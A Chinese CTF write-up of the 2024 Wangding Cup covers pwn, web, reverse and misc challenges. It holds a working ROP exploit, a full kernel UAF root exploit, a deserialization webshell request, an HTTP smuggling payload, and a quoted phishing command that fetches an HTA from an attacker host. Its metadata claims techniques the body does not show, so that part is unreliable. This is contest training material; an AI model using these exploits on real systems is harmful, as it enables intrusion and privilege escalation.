---
title: 2024 第四届"网鼎杯"玄武组 pwn02 writeup（fork + ret2syscall 栈迁移）
contest: 2024 第四届网鼎杯
year: 2024
difficulty: hard
vuln_type:
- srop
- ret2libc
- rop
- shellcode
tags:
- 玄武 pwn02
- x11x11x11... 绕过检测
- fork 后栈溢出
- pwndbg 不能跟 fork
- 通用 gadget 链 rax/rdi/rsi/rdx/rbp/leave_ret
- AE64 shellcode 编码
- libc-2.35 SROP 栈迁移
- read 写 bss 0x4C72A0+0x100
- execve /bin/sh
attack_chain:
- x11x11x11... 绕过前段检测
- 进 fork 子进程，栈溢出
- pwndbg 不能跟 fork → 直接打 ret2syscall
- '通用 gadget: rax=0x450277, rdi=0x40213f, rsi=0x40a1ae, rdx=0x485feb, rbp=0x401771, syscall=0x41ac26, leave_ret=0x40192F'
- 第一次 read 写 bss 0x4C72A0+0x100 拿到 execve 链子
- 第二次 execve("/bin/sh", 0, 0)
key_payload: rax=0x450277; rdi=0x40213f; rsi=0x40a1ae; rdx=0x485feb; rbp=0x401771; syscall=0x41ac26; leave_ret=0x40192F
one_liner: 玄武 pwn02：fork 后栈溢出 + 通用 gadget 链 SROP + read 写 bss + AE64 shellcode 编码 — 大程序最常用 ROP 套路。
lesson: pwndbg 不能跟 fork 是 GDB 调试盲点，要么用 `set follow-fork-mode parent/child` 切换，要么干脆单步 payload 直出；AE64 库用来编码 shellcode 绕过字符过滤（pwntools `asm(shellcraft.sh())` 经常含坏字符）。
quality: high
full_path: 2024第四届“网鼎杯”玄武组_writeup.full.md
meta_path: 2024第四届“网鼎杯”玄武组_writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2024 第四届"网鼎杯"玄武组 pwn02 writeup（fork + ret2syscall 栈迁移）。玄武 pwn02：fork 后栈溢出 + 通用 gadget 链 SROP + read 写 bss + AE64 shellcode 编码 — 大程序最常用 ROP 套路。。关键路径：x11x11x11... 绕过前段检测 → 进 fork 子进程，栈溢出 → pwndbg 不...
category: pwn
subcategory: rop
subcategories:
- rop
- stack_overflow
tools_used:
- GDB
- ROP
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 2
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/214152.html
reasoning_chain:
- '[触发点] 程序 main 给出 stack gift（栈地址）和两次 read 提示 → 假设：栈溢出 + 二次栈迁移 → [动作] gift = int(p.recv(18),16) 接收 → [观察] 拿到栈地址 → [下一步] 准备 SROP payload'
- '[触发点] 第一次 sendafter 后出现 ''once again?'' → 假设：第二次 read 触发溢出 → [动作] payload = b''\x40''*0x108 + p64(gift)*2 + ROP(rdi=0,rsi=bss,rdx=0xfff,syscall) + leave_ret → [观察] 第一次 read 把 payload 写到栈，第二次 read 触发栈迁移到 bss'
- '[触发点] bss 上 SROP read shellcode 后再 execve → 假设：通用 gadget 链足够 → [动作] payload = ''/bin/sh\x00'' + rdi=bss + rsi=0 + rdx=0 + rax=0x3b + syscall → [观察] 拿到 shell'
- '[触发点] pwn3 题目 kallsyms 文件可读 → 假设：可直接读内核符号表 → [动作] cat /proc/kallsyms → [观察] 拿到 pipe_buffer/pipe_buf_operations 内核结构偏移 → [下一步] UAF 改 pipe_buffer.ops'
- '[触发点] UAF 改 pipe_buffer.ops 指向堆上的 fake ops → 假设：调用 release/confirm 时跳到 ROP 链 → [动作] pipe()+read+write 触发 → [观察] ROP 跳到 stack pivot 到堆'
failed_attempts:
- 试图用 pwndbg 跟 fork 父进程 → 失败：fork 后 pwndbg 不会自动跟父进程调试
- 试图直接 system('/bin/sh') → 失败：system 含 '\x0b' 等坏字符被过滤
- 试图用 one_gadget 找 shell → 失败：题目 libc 版本无合适 one_gadget
key_observations:
- 大程序 pwn 题通用 gadget 链是 rax=59 / rdi='/bin/sh' / rsi=0 / rdx=0 + syscall 的标准模板
- fork 子进程 pwndbg 必须 `set follow-fork-mode parent/child` 切换，否则默认跟父进程
- AE64 库用 AE64 编码 shellcode 绕过字符过滤
- kallsyms 文件可读时直接读 pipe_buffer/pipe_buf_operations 偏移，UAF 改 ops 指针劫持内核结构
prerequisites:
- SROP（Sigreturn-Oriented Programming）原理
- 通用 gadget 链构造（rax/rdi/rsi/rdx/syscall）
- AE64 shellcode 编码库
- kernel pwn pipe_buffer 结构基础
---
# 2024第四届“网鼎杯”玄武组 writeup

> 原文: https://www.ctfiot.com/214152.html
> ID: 214152

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

PWN

pwn02

首先拿到题目，checksec，检查一下保护
image-20241104152553574

之后调试运行，发现给出canary，接受一下

找到主函数
image-20241104153451391

漏洞函数
image-20241104153621959

x11x11x11….绕过检测，之后进入fork，并且有栈溢出，pwndbg没办法跟fork，这里选择打ret2syscall
image-20241104174622553
image-20241104152820615

首先设置一次read并执行栈迁移返回我们读入的地方，因为我们要读入execve的链子
image-20241104153056315

成功劫持程序流程
image-20241104153740928

执行完之后获取shell
image-20241104153802315

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
 return u32(p.recvuntil("xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx = 0x0000000000485feb
rbp = 0x0000000000401771
bss = 0x4C72A0 + 0x100
syscall = 0x000000000041ac26
leave_ret=0x40192F
rl(b"gift: ")
gift = int(p.recv(18),16)
li(hex(gift))
pay = p64(1)*8
s(pay)
rl("Wanna return?n")
s(b'a')
rl("once again?n")
pay = b'x40'*(0x100)
#bug()
s(pay)

rl("once again?n")
pay = b'x11'*(0x108) + p64(gift)*2 + p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(rdx) + p64(0xfff)*2 + p64(rax)+p64(0)+p64(syscall)+p64(rbp)+p64(bss)+p64(leave_ret)
#bug()
sl(pay)

#pause()
payload=b'/bin/shx00'+p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)

s(payload)

inter() 

pwn3

拿到题目，进行分析

题目存在明显的uaf，并且kallsyms文件可读，所以只需要泄漏堆地址即可，随后通过uaf修改pipe_buffer的ops到堆上，最终劫持栈到堆上实现rop
image-20241104172808077

kallsyms文件可读
image-20241104173136936

代码片段实现了一个利用用户内存释放漏洞（Use-After-Free, UAF）的攻击载荷。主要步骤包括创建消息队列、发送和接收消息以操控内存，最终利用ROP（返回导向编程）技术执行代码

#define _GNU_SOURCE
#include <err.h>
#include 
#include <sched.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <stdio.h>
// #include <linux/userfaultfd.h>
#include 
#include <errno.h>
#include 
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include 
#include <time.h>

#define MSG_COPY 040000
#define MSG_TAG 0xAAAAAAAA
#define PRIMARY_MSG_TYPE 0x41
#define SECONDARY_MSG_TYPE 0x42

#define MSG_QUEUE_NUM 4096

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400
#define VICTIM_MSG_TYPE 0x1337

#define SOCKET_NUM 32
#define SK_BUFF_NUM 128
#define PIPE_NUM 256

size_t user_cs, user_ss, user_sp, user_rflags;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    puts("[*]status has been saved.");
}

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msgseg
{
    uint64_t next;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts;    /* message text size */
    void *next;     /* struct msg_msgseg *next; */
    void *security; /* NULL without SELinux */
    /* the actual message follows immediately */
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset, len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

void errExit(char *err_msg)
{
    puts(err_msg);
    exit(-1);
}

void get_shell()
{
    if (getuid())
    {
        printf(" 33[31m 33[1m[x] Failed to get the root! 33[0mn");
        exit(-1);
    }
    printf(" 33[32m 33[1m[+] Successful to get the root. Execve root shell now... 33[0mn");
    system("/bin/sh");
}

void print_hex(char *buf, int size)
{
    int i;
    puts("======================================");
    printf("data :n");
    for (i = 0; i < (size / 8); i++)
    {
        if (i % 2 == 0)
        {
            if (i / 2 < 10)
            {
                printf("%d  ", i / 2);
            }
            else if (i / 2 < 100)
            {
                printf("%d ", i / 2);
            }
            else
            {
                printf("%d", i / 2);
            }
        }
        printf(" %16llx", *(size_t *)(buf + i * 8));
        if (i % 2 == 1)
        {
            printf("n");
        }
    }
    puts("======================================");
}

unsigned long kernel_addr;
unsigned long kernel_base;
unsigned long kernel_offset;
int fd;

void create(int size)
{
    ioctl(fd, 0x0, size);
}

void delete()
{
    ioctl(fd, 1);
}

void obj_read(char *buf, int bufsize)
{
    read(fd, buf, bufsize);
}

void obj_write(char *buf, int bufsize)
{
    write(fd, buf, bufsize);
}

int my_read(int fd, char *buf, int size)
{
    char a;
    for (int i = 0; i < size; i++)
    {
        read(fd, &a, 1);
        if (a == 0xa || a == 0)
        {
            break;
        }
        buf[i] = a;
    }
    return 1;
}

int main()
{
    signal(SIGSEGV, get_shell);
    signal(SIGINT, get_shell);
    save_status();

    char *buf = malloc(0x4000);
    unsigned long *point_buf = malloc(0x4000);
    int victim_qid = -1;
    int sk_sockets[SOCKET_NUM][2];
    int msqid[MSG_QUEUE_NUM];
    char fake_secondary_msg[704];
    struct msg_msg *nearby_msg;
    struct msg_msg *nearby_msg_prim;
    unsigned long victim_addr;
    unsigned long search_addr;
    struct pipe_buffer *pipe_buf_ptr;
    int pipe_fd[PIPE_NUM][2];
    struct pipe_buf_operations *ops_ptr;
    unsigned long *rop_chain = malloc(0x2000);

    uint64_t start = 0, commit_creds = 0, init_cred = 0;
    uint64_t mov_rsp_rax = 0xffffffff818ad887;
    uint64_t mov_rax_rsi = 0xffffffff810a0e13;

    int file = open("/proc/kallsyms", O_RDONLY);
    if (file < 0)
    {
        printf("%dn", file);
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char kallsyms_buf[0x30] = {0};
    while (my_read(file, kallsyms_buf, 0x30))
    {
        // if (strstr(kallsyms_buf, "commit_creds") && !commit_creds)
        // {
        //     char hex[20] = {0};
        //     strncpy(hex, kallsyms_buf, 16);
        //     sscanf(hex, "%llx", &commit_creds);
        //     printf("commit_creds addr: %pn", commit_creds);
        // }
        // if (strstr(kallsyms_buf, "init_cred") && !init_cred)
        // {
        //     char hex[20] = {0};
        //     strncpy(hex, kallsyms_buf, 16);
        //     sscanf(hex, "%llx", &init_cred);
        //     printf("init_cred addr: %pn", init_cred);
        // }
        if (strstr(kallsyms_buf, "startup_64") && !start)
        {
            char hex[20] = {0};
            strncpy(hex, kallsyms_buf, 16);
            sscanf(hex, "%llx", &start);
            init_cred = start + 0xe5a140;
            commit_creds = start + 0xac050;
            printf("startup_64 addr: %pn", start);
            printf("commit_creds addr: %pn", commit_creds);
            printf("init_cred addr: %pn", init_cred);
        }
        if (start && commit_creds && init_cred)
        {
            break;
        }
        memset(kallsyms_buf, ' ', 0x30);
    }

    fd = open("/dev/easy", O_RDWR);
    if (fd < 0)
    {
        puts("error open easy");
        exit(0);
    }

    puts("n 33[34m 33[1m[*] trigger UAF 33[0m");

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));
    *(long *)&primary_msg = PRIMARY_MSG_TYPE;
    *(long *)&secondary_msg = SECONDARY_MSG_TYPE;
    *(int *)&primary_msg.mtext[0] = MSG_TAG;
    *(int *)&secondary_msg.mtext[0] = MSG_TAG;

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (msgsnd(msqid[i], &primary_msg,
                   sizeof(primary_msg) - 8, 0) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[8] = i;
        if (msgsnd(msqid[i], &secondary_msg,
                   sizeof(secondary_msg) - 8, 0) < 0)
            errExit("failed to send secondary msg!");
        if (i == 1024)
        {
            create(0x400);
            memset(buf, 'a', 0x400);
            obj_write(buf, 0x400);
            delete ();
        }
    }

    obj_read(buf, 0x400);
    print_hex(buf, 0x50);
    uint64_t next_msg_addr = *(uint64_t *)(buf + 8);
    int idx = *(int *)(buf + 0x38);
    *(uint64_t *)(buf + 0x20) = next_msg_addr + 0x20 - 0x60;
    *(uint64_t *)(buf + 0x18) = 0x1050;
    printf("next_msg_addr => %pn", next_msg_addr);
    printf("current_msg_idx => %dn", idx);
    obj_write(buf, 0x50);

    if (msgrcv(msqid[idx], buf, 0x1050, 1, MSG_COPY | IPC_NOWAIT) < 0)
    {
        puts("error recv");
        exit(-1);
    }

    print_hex(buf + 0x1000 - 0x30, 0x80);
    uint64_t current_msg_addr = *(uint64_t *)(buf + 0x1010);
    printf("current_msg_addr => %pn", current_msg_addr);

    obj_read(buf, 0x400);
    *(uint64_t *)(buf + 0x20) = 0;
    *(uint64_t *)(buf + 0x18) = 0x3d0;
    obj_write(buf, 0x50);

    if (msgrcv(msqid[idx], buf, 0x400, SECONDARY_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) < 0)
    {
        errExit("failed to read victim msg!");
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("failed to create pipe!");

        if (write(pipe_fd[i][1], "196082", 6) < 0)
            errExit("failed to write the pipe!");
    }

    obj_read(buf, 0x400);

    uint64_t offset = start - 0xffffffff81000000;

    uint64_t push_rsi_pop_rsp_pop_1val_ret = 0xffffffff8133c5af + offset;
    uint64_t pop3_ret = 0xffffffff81002050 + offset;
    uint64_t pop_rdi = 0xffffffff81048955 + offset;
    uint64_t swapgs_pop = 0xffffffff81065354 + offset;
    uint64_t iretq = 0xffffffff8162dfee + offset;

    printf("push_rsi_pop_rsp_pop_1val_ret => %pn", push_rsi_pop_rsp_pop_1val_ret);

    uint64_t fake_ops[0x20] = {0};
    fake_ops[0] = 1;
    fake_ops[1] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[2] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[3] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[4] = push_rsi_pop_rsp_pop_1val_ret;
    fake_ops[5] = 0;

    uint64_t rop_count = 1;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop3_ret;
    *(uint64_t *)(buf + 8 * rop_count++) = pop_rdi;
    *(uint64_t *)(buf + 8 * rop_count++) = init_cred;
    *(uint64_t *)(buf + 8 * rop_count++) = commit_creds;
    *(uint64_t *)(buf + 8 * rop_count++) = swapgs_pop;
    *(uint64_t *)(buf + 8 * rop_count++) = 0;
    *(uint64_t *)(buf + 8 * rop_count++) = iretq;
    *(uint64_t *)(buf + 8 * rop_count++) = get_shell;
    *(uint64_t *)(buf + 8 * rop_count++) = user_cs;
    *(uint64_t *)(buf + 8 * rop_count++) = user_rflags;
    *(uint64_t *)(buf + 8 * rop_count++) = user_sp;
    *(uint64_t *)(buf + 8 * rop_count++) = user_ss;
    *(uint64_t *)(buf + 0x10) = (uint64_t *)fake_ops;

    obj_write(buf, 0x200);

    sleep(20);

    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    return 0;
}

编写发送脚本，将一个可执行的二进制文件安全地上传到远程服务器

from pwn import *
from sys import argv

r = remote('0192f63f439f7e97b7da08dd813722a8.w87i.dg02.ciihw.cn',43584)
context.log_level = 'debug'

def send_file(name, sym):
    file = read(name)
    f = b64e(file)
    size = 100
    print("each_size:", size)
    print(len(f))
    r.sendlineafter(sym, b"cd /tmp")
    r.sendlineafter(sym, b"rm *")
    r.sendlineafter(sym, b"touch /tmp/exp.gz.b64")
    total_count = 0
    if len(f) // size < len(f) / size:
        total_count = (len(f)//size)+1
    else:
        total_count = (len(f)//size)

    for i in range(len(f)//size):
        log.info("Sending chunk {}/{}".format(i+1, total_count))
        r.sendlineafter(
            sym, "echo -n '{}'>>/tmp/exp.gz.b64".format(f[i*size:(i*size)+size]))

    if len(f) // size < len(f) / size:
        i += 1
        log.info("remaining size: {}".format(len(f[i*size:])))
        log.info("Sending chunk {}/{}".format(i+1, total_count))
        r.sendlineafter(
            sym, "echo -n '{}'>>/tmp/exp.gz.b64".format(f[i*size:]))

    r.sendlineafter(sym, b"cat /tmp/exp.gz.b64 | base64 -d >/tmp/exp.gz")
    r.sendlineafter(sym, b"gzip -d /tmp/exp.gz")
    r.sendlineafter(sym, b"chmod +x /tmp/exp")
    # r.sendlineafter(sym, b"/tmp/exp")

def exploit():
    sym = b"$"
    os.system('rm exp.gz')
    os.system('cp ./exp ./exp.bak')
    os.system('gzip ./exp')
    os.system('mv exp.bak exp')
    send_file("exp.gz", sym=sym)

    r.interactive()

if __name__ == "__main__":
    exploit()

image-20241104173757661

成功传输
image-20241104173840478

得到flag
image-20241104173921288

Web

web1

下载源码或观察首页icon可知eyoucms。

从/data/conf/version.txt得到版本号：

后台为/login.php，弱口令admin/admin即可登录。

需要找1.6.5版本的后台洞。sink就是dfvalue反序列化。

可以打5.0.24 tp的反序列化链

但是有一些坑，一个是各大分析文章都提到的dfvalue这里会限制长度500，另一点是无论arctype_edit还是channel_edit方法都会过滤字符导致反序列化利用失败。

检索到文章https://cn-sec.com/archives/2640154.html。

后面复现就完事了，在功能地图找到编辑字段功能，新增字段：

抓包将请求内容中dtype参数修改为region：

点击编辑抓包，修改dtype[]=region 绕过脏字符的过滤，dfvalue修改成tp 5.0.24缩短版的链子：

访问/login.php?m=admin&c=Field&a=channel_edit&channel_id=-99&id=545&_ajax=1触发反序列化

访问/a.php617ac73525b333bea4ac35a717dd8b0a.php?_=system(%22cat%20/flag.txt%22);得到flag。

web3

扫描得到/robots.txt，给了一个bmp文件、用户名和密码。

wbStego4.bmp
username: root456
password: *111!!```

远程nginx1.18.0有个请求走私可以打，但给了ssh应该是要ssh连上去打下一步，也没扫到403授权路由的话这里走私就没用了。

GET / HTTP/1.1
Host: www.0-sec.org
Content-Length: 4
Transfer-Encoding : chunked

46
GET /wbStego4.bmp HTTP/1.1
Host:
www.0-sec.org
Content-Length:15

kk
0s

ssh登陆还需要找到私钥。

只能看wbStego4.bmp了，从文件名可以看出存在bmp隐写，下载wbStego4提取隐写数据，密码为空提取：

得到

RW_IHZ.KFY&gt;HHS-IHZ AAAAB3NzaC1yc2EAAAADAQABAAABAHqSISYfkwuFeX20KTtyDhpG/nmyMK5MrmjKILUbLxpEtgw+4i0sIR4sWtNpGSVAMLZ4YO8EY6p7FBw0z4u0ALo2qC8I763lfKlNXH1WHWexRHd72MEpxpOzt79ukabEr7OWpRdDEISj3MyEalVNYGTKMt/TQWR/dnFd+TsDB2aRDBQQq9VfQhZ9Z864huQ4Du8PKg42plzfRPJsEhe4JpE0GW5QRap9ZNHM/4fSSHJlwqbBqGdeIjw+U7zY/RokxK979+f7SN6qMc9FzAUTnbwFGLpZe4ohz4pPJNrmRKfERTSKDoXw1krdDZuEZzCgiprpR8WqLvGoDXhYstcrgWU=

这里用A…Z仿射替换掉Z…A

s = 'RW_IHZ.KFY&gt;HHS-IHZ AAAAB3NzaC1yc2EAAAADAQABAAABAHqSISYfkwuFeX20KTtyDhpG/nmyMK5MrmjKILUbLxpEtgw+4i0sIR4sWtNpGSVAMLZ4YO8EY6p7FBw0z4u0ALo2qC8I763lfKlNXH1WHWexRHd72MEpxpOzt79ukabEr7OWpRdDEISj3MyEalVNYGTKMt/TQWR/dnFd+TsDB2aRDBQQq9VfQhZ9Z864huQ4Du8PKg42plzfRPJsEhe4JpE0GW5QRap9ZNHM/4fSSHJlwqbBqGdeIjw+U7zY/RokxK979+f7SN6qMc9FzAUTnbwFGLpZe4ohz4pPJNrmRKfERTSKDoXw1krdDZuEZzCgiprpR8WqLvGoDXhYstcrgWU='
en='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
de='ZYXWVUTSRQPONMLKJIHGFEDCBA'
result = ''
for i in range(0,len(s)):
if "Z"&gt;=s[i] &gt;= "A":
index = en.find(s[i])
result+=de[index]
else:
result = result+s[i]
print(result)

解出来发现是一个ssh公钥。

后来ssh-keygen -l -f id_rsa1.pub验证才发现解密写错了 空格后面的公钥部分不需要解密。

首先将pub格式转换成PKCS8 pem形式，随后openssl读取公钥证书的n和e。

ssh-keygen -f id_rsa1.pub -e -m PKCS8 &gt; id_rsa_pkcs18.pem
openssl pkey -pubin -in id_rsa_pkcs18.pem -text -noout

转成10进制后交给yafu分解得到p,q：

s="""
7a:92:21:26:1f:93:0b:85:79:7d:b4:29:3b:72:0e:
1a:46:fe:79:b2:30:ae:4c:ae:68:ca:20:b5:1b:2f:
1a:44:b6:0c:3e:e2:2d:2c:21:1e:2c:5a:d3:69:19:
25:40:30:b6:78:60:ef:04:63:aa:7b:14:1c:34:cf:
8b:b4:00:ba:36:a8:2f:08:ef:ad:e5:7c:a9:4d:5c:
7d:56:1d:67:b1:44:77:7b:d8:c1:29:c6:93:b3:b7:
bf:6e:91:a6:c4:af:b3:96:a5:17:43:10:84:a3:dc:
cc:84:6a:55:4d:60:64:ca:32:df:d3:41:64:7f:76:
71:5d:f9:3b:03:07:66:91:0c:14:10:ab:d5:5f:42:
16:7d:67:ce:b8:86:e4:38:0e:ef:0f:2a:0e:36:a6:
5c:df:44:f2:6c:12:17:b8:26:91:34:19:6e:50:45:
aa:7d:64:d1:cc:ff:87:d2:48:72:65:c2:a6:c1:a8:
67:5e:22:3c:3e:53:bc:d8:fd:1a:24:c4:af:7b:f7:
e7:fb:48:de:aa:31:cf:45:cc:05:13:9d:bc:05:18:
ba:59:7b:8a:21:cf:8a:4f:24:da:e6:44:a7:c4:45:
34:8a:0e:85:f0:d6:4a:dd:0d:9b:84:67:30:a0:8a:
9a:e9:47:c5:aa:2e:f1:a8:0d:78:58:b2:d7:2b:81:
65
"""
s=s.replace(":","").replace("n","").replace(" ","")
decimal_number = int(s, 16)

print("十进制数字:", decimal_number)

让GPT帮忙写个脚本生成私钥：

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers
from sympy import mod_inverse

# 已知的 RSA 参数
p = 124391046068661849479368048442368264528688137061859889420748135089530711531982879099228365579453507914971808645098707899792342947071605270753221189146520461936329644320307671256282476976106892669621936765657513838321041373894048138250076354093023213535042038834560618477692450327056145702068970492978556584563
q = 124391046068661849479368048442368264528688137061859889420748135089530711531982879099228365579453507914971808645098707899792342947071605270753221189146520461936329644320307671256282476976106892669621936765657513838321041373894048138250076354093023213535042038834560618477692450327056145702068970492978556583623

e = 65537
n = p * q
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
# 计算 dp, dq 和 qinv
dp = d % (p - 1)
dq = d % (q - 1)
qinv = pow(q, -1, p)

# 使用 `RSAPrivateNumbers` 构造 RSA 私钥对象
private_numbers = RSAPrivateNumbers(
p=p,
q=q,
d=d,
dmp1=dp,
dmq1=dq,
iqmp=qinv,
public_numbers=rsa.RSAPublicNumbers(e=e, n=n)
)
private_key = private_numbers.private_key(backend=default_backend())

# 导出私钥为 PEM 格式
private_key_pem = private_key.private_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PrivateFormat.TraditionalOpenSSL,
encryption_algorithm=serialization.NoEncryption()
)

# 将私钥保存为 PEM 文件
with open("private_key.pem", "wb") as f:
f.write(private_key_pem)

print("私钥已成功保存为 private_key.pem")

最后指定私钥登录得到flag，用户名填写robots.txt得到的root456。

 Reverse

re02

用jadx打开jar包

定位关键逻辑

发现了类似BASE64的操作

后面全局搜AES

发现了key

然后在众多密文里进行解密

找到flag

 Misc

misc2

根据ATTCK，网络钓鱼就是T1566

(1/10) 系统被通过什么方式植入了恶意软件,该种方式对应ATT&CK的TTPs号是什么? 示例:
T001
请输入你的答案 > T1566
正确✅!

进入foxmail，可以看到第一封邮件就是钓鱼邮件

有一个lnk

保存一下，查看属性指向

查看lnk的十六进制找到SID

(2/10) 攻击者所使用了的钓鱼载荷后缀名是什么? 以及其的SID号是什么? 两个题目的答案请使用_连接 示例:
exe_776645432432
请输入你的答案 > lnk_S-1-5-21-2014616596-768976026-1254046286-1001
正确✅!

上一步属性里找到C:
WindowsSystem32mshta.exe http://172.25.136.161:
8000/install.hta

(3/10) 其钓鱼载荷执行的命令是什么 示例:
cmd.exe /c powershell(注意:
按照示例的写不用写全路径)
请输入你的答案 > mshta.exe http://172.25.136.161:
8000/install.hta
正确✅!

在文件夹下搜索hta拿到路径

(4/10) 其命令所请求的缓存文件夹是什么 示例: C:/Users/xxx/xxx/xxxx
请输入你的答案 > C:/Users/Wang/AppData/Local/Microsoft/Windows/Temporary Internet Files/Content.IE5/UFFAFLNS
正确✅!

vscode打开hta，可以知道执行了vb代码，下载了Flycode_VPN_installer.exe

temp目录下找到

用dnspy反编译，解base64就行

然后发现还是一个exe，再次用dnspy反编译

(5/10) 攻击者使用了何种RAT? 示例:
asyncrat
请输入你的答案 > xenorat
正确✅!

有加密和解密函数，直接可以看到有这样的命名

(6/10) 木马使用了何种加密算法加密数据? 示例:
DES
请输入你的答案 > aes
正确✅!

使用de4dot解混淆，program里边拿到IP和端口，同时还能拿到aes的key

(7/10) 木马所连接的IP和端口是什么? 示例:
192.168.345.21:
7000
请输入你的答案 > 172.25.136.161:
10004
正确✅!

木马是不可能存放目标机器的信息的，所以只可能在通信流量里边，通信时使用了aes加密且key在上一问也看到。写脚本解密流量

from Crypto.Cipher import AES  
  
enc = AES.new(key=bytes.fromhex('85aaa9cc1dc1043104935f4a658d6091940c45127da6398e885231908c0f5d1d'),iv=b'x00'*16,mode=AES.MODE_CBC)  
  
s='''7100000000e9ba158fdff498979e080818eb73f5a2f5a850d5beb8c77e0791d880146f98ae27b47023d656df40bfdbb9996f9cb3d7fd74140bfef2e71275a24510acf1439df35efeb32502a62206e4688de70ef5a4e74c3b3e0c6bb550e38b0b5deb9b5e3281a7f7e65efe8652d13882bb619f0f78  
71000000032bc8b1334e21da17bb95ec4e03d6b0c2d776daa95ae5e8dff288ca63b543d574fc9db7438b514bac4333f6a20f1f8da3bf16935b7deeae12c1e075e0da147adc148a33838f9d35ad4ecff03f09d0dcf00b01a0163be283f2863442503a6a23b251dc2bc6aa660db012002596c530ab76  
11000000039fbb23d18d68972f0ae6de8219190cb0  
1100000003b2d10af5854b91e2e764c986d1d64c18  
110000000323145f9a56536a180c113c5e21812c40  
11000000033bac521ae26859766243c036301f87c4  
7100000003bc4faceefa1dc31d452b7348201f65481831c0d0c7512eb13e5e1d258e8583b959e3239dd9f2f495ee0b384e24453898eb1b1b73003ac5c6d662940cb92bfcbabbaa4eed9ab68e13d118128053495cbbb6b42bdf31f01d3eb36b12f7ce110e5e092b082fd9c551834f26174faa1b16ad  
1100000003b92d5ac86208df769ece4abece0dc85f  
11000000033bac521ae26859766243c036301f87c4  
1100000003443a21e5c8a2bd68f64c38fa8288c44e  
11000000033bac521ae26859766243c036301f87c4  
